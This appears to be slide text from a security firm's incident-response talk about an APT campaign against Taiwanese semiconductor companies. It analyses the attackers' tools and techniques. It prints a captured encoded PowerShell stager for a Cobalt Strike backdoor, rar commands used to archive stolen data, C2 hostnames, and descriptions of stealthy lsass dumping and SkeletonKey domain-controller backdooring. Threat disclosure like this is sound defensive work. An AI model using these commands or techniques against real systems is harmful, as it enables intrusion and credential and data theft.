•
RAR software, had a one-byte discrepancy from the original version
➢
The same file was also found on other machines. Thus, it is likely to have been used
in past attacks
➢
Inserting malware in a location, where legal software is stored, seems to be a
characteristic tactic of Operation Chimera
Root Cause Analysis– IP1
➢
IP1 is a unscanned host and related to many accounts. It could be a shared
machine or a VPN host
➢
VPN can also be compromised. Never use VPN as your only line of defense
B Company
• Investigation Reason
• Statistic Summary 
B Company : Overview
B company 
compromise
B has business 
cooperation 
with C 
company
B&C create a 
bridge between 
their networks
C discovers 
anomaly 
activities from 
B
Asks us to 
investigate
Time Period
# of Event 
# of compromised endpoints
# of data leaks
# of malware
2018/8/7 ~ 2019/12/11
140k+
14
9
10
Powershell
➢
Fileless
•
10 endpoints, which included two 
domain controllers 
➢
The
powershell
script
executed
a
Cobalt Strike backdoor and was used
for process migration to other system
processes svchost.exe
powershell -nop -w hidden -encodedcommand
JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwB
uAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAE
EAQQBBAEEAQQBLAFYAVwBiAFcALwBpAE8AQgBEACsAMwBQAHcASwBYADQAVgAwAG8ASgBaADMAdABnAHQAZABWAFYAb
wBuAFEAQQBrAGwAbABKAGMAVwAyAGsAWABWAHkAUwBRAG0AdQBEAGcASgBkAFoAeQBtAGQATABmAC8ALwBTAFkAdgA1
AEoAYgAyAGIAawArADYAaQB4AFEAbABuAHMAdwA4AE0AOAA5ADQAUABKAE0AcABsAGMAVwBwAEYATQB5AFUAaABtAGQ
AUgBWAEoAeABSADQAVABQ
APT Attack
➢
Cobalt Strike was used to inject the malware into
the system, enabling the attacker to access the
system and communicate with a C2
•
C2: striking-pipe-253603.appspot.com, 
msplatform-updates.azureedge.net, chrome-
applatses.appspot.com
Cyber Situation Graph
➢
Company already seriously hacked
➢
Difficult to manually investigate, needed help from A.I.
❖ 2018.11
❖ 2019.03
❖ 2019.06
❖ 2019.09
Hacker returns on a 
quarterly basis to 
collect new data.
❖ 2019.11, Deploy new weapon SkeletonKey Injector
❖ 2019.12, Harvest new endpoints
Archive Password
➢
The actor also used a RAR program
with innocuous file names, such as
RecordedTV.ms,
jucheck.exe
and vmware.log to archive and steal
the data of interest
➢
A similar scheme was utilized by the
attacker to archive the passwords they
used
c:\users\xxxx\libraries\RecordedTV.ms
a -m5 -
v71m –hpf**kyou.google.com11 vmlum-vss.log 
vmlum-vmvss.log
C:\Windows\system32\cmd.exe /C 
c:\users\xxxxxx\libraries\RecordedTV.ms a -m5 -r 
–hpf**kyou.google.com11 vmlum-vmopt.log 
“\\\personal\\-
Traning-v1.1.pptx" > vmlumss.log & dir vmlum-
vmopt*
Leaked File Name
➢
During our investigation, we made an inventory of the leaked data. Some of the
data is shown below:
➢
Attacker's intent was stealing intelligence property
➢
Business spy? State-sponsor attack to benefit a certain industry?
\\Users\\Project\Roadmap
\\Users\\Backup\Workspace
\\Users\\chip and SDK setting
\\Users\\ SDK 
Installation guide.pdf
Actors' Digital Arsenal
CyCraft Proprietary and Confidential Information
Actors' Digital Arsenal
►Cobalt Strike Beacon
►WinRAR
►SkeletonKey Injector
►Winnti Backdoor
Cobalt Strike Beacon
CyCraft Proprietary and Confidential Information
Cobalt Strike Beacon
►Cobalt Strike Beacon was used as main backdoor
►Overwrite GoogleUpdate.exe for persistency
►Identical file was discovered in 3+ companies
►C2
► chrome-applatnohp.appspot.com
► ussdns04.heketwe.com
► ussdns02.heketwe.com
► ussdns01.heketwe.com
CyCraft Proprietary and Confidential Information
Suspicious R-W-X Memory
►Our product detected suspicious memory block
CyCraft Proprietary and Confidential Information
Hybrid Payload: PE as Shellcode
►"MZ" signature can be decoded as "pop r10" under x64 architecture
►"dec ebp; pop edx" under x86 architecture
►At offset 0x1791c is a shellcode-like function called "reflective loader"
►0x56A2B5F0 is the hash value of "ExitProcess"
Locate address of itself, and use it as first argument (rdi)
Compuate address of reflective loader and execute it
CyCraft Proprietary and Confidential Information
Malicious Process
Injection Strategy: Named Pipe
CobaltStrike
Beacon Module
Target Process
Stager Shellcode
Real Payload
Execute
Spawn
Execute
WinRAR
CyCraft Proprietary and Confidential Information
WinRAR
►They use rar.exe to compress and encrypt the files to be stole
►There's a folder named "RecordedTV.library-ms" under same path
CyCraft Proprietary and Confidential Information
Mutated rar.exe
►The file was uploaded to VirusTotal in 2009
►It's rar.exe from WinRAR 3.60b8 but different from original one
►Only 1byte was different, but we've confirmed that was not a crack
►This patch may cause the program crash
►Hypothesis 1: Change file hash to avoid detection
►Hypothesis 2: Bit flip during copy
Patch diff (before / after)
Disassembly of patch
SkeletonKey Injector
CyCraft Proprietary and Confidential Information
SkeletonKey Injector
►A new malware combined "dumpert" and "mimikatz"
►"mimikatz" is a well-known hacking tool
⚫
Most people use it to dump Windows credentials, but its capability is more than that
►"dumpert" is a tool to dump lsass.exe memory stealthily
CyCraft Proprietary and Confidential Information
Dumpert
►Made by a security company called Outflank
►Dump lsass.exe stealthy via direct system call
►Windows system call numbers changed from release to release
►DLL export function is the only stable interface
►That's why Windows shellcode always needs to locate DLLs in memory
CyCraft Proprietary and Confidential Information
Dumpert: Implementation
►Use ntdll!RtlGetVerion to determine Windows version
►Load different syscall function for different version
►Bypass any user-space hook
CyCraft Proprietary and Confidential Information
SkeletonKey
►APT malware discovered by DELL Secureworks in 2015
►Implants a backdoor password to domain controller
►The original password was still valid, wrong password still got rejected
►Inject code into lsass.exe process to alter authentication routine
CyCraft Proprietary and Confidential Information
Impact of SkeletonKey Injector
►No need to use administrator credentials for lateral movement
►It leaves nearly no clue, only logon success events
►You must reboot domain controller to clean the SkeletonKey
►We've observed some other attack that using modified mimikatz
Winnti Backdoor
CyCraft Proprietary and Confidential Information
Strange Network Tool: baseClient.exe
►We thought that was a network probing tool
CyCraft Proprietary and Confidential Information
Winnti Backdoor
►We thought baseClient.exe in our public report was a network probing tool
►It's actually Winnti backdoor
Other APT Events in Taiwan
CyCraft Proprietary and Confidential Information
ColdLock Ransomware
►Taiwan's national gasoline company was hit by ransomware
►ColdLock was based on an open-source ransomware: EDA2
►Ministry of Justice Investigation Bureau said the attack was related to Winnti group
CyCraft Proprietary and Confidential Information
SkeletonKey Attack in Taiwan
►Serval attacks against Taiwan government agencies used SkeletonKey
►Modified version of mimikatz executed file-lessly
When OpenProcess failed, it will load mimikatz driver to unprotect lsass.exe and try again.
CyCraft Proprietary and Confidential Information
Take Away
►Disclosure a large-scale APT attacks targeting semiconductor; more 
than 7 vendors are compromised.
►Precisely attacks. Targets leading semiconductor vendors, their 
subsidiaries, partners and competitors.
►Their goals is stealing intelligence property(documents, source code, 
SDK of chip related projects). Make long-term damage to the victim.
CyCraft Proprietary and Confidential Information
Take Away
►Attackers utilize varies open source, general tools to make attribution 
harder.
►In 2 shared case studies, AD & VPN are compromised. Enterprises 
should consider resilience of IT systems. Avoid relying on a single 
security service. 
►A rarely used SkeletonKey technique is used, which makes 
adversaries login like normal user. - Persistence, Defense Evasion.    
►No system is safe. Regularly threat hunting, shorten the MTTD/MTTR.
Thanks for your listening!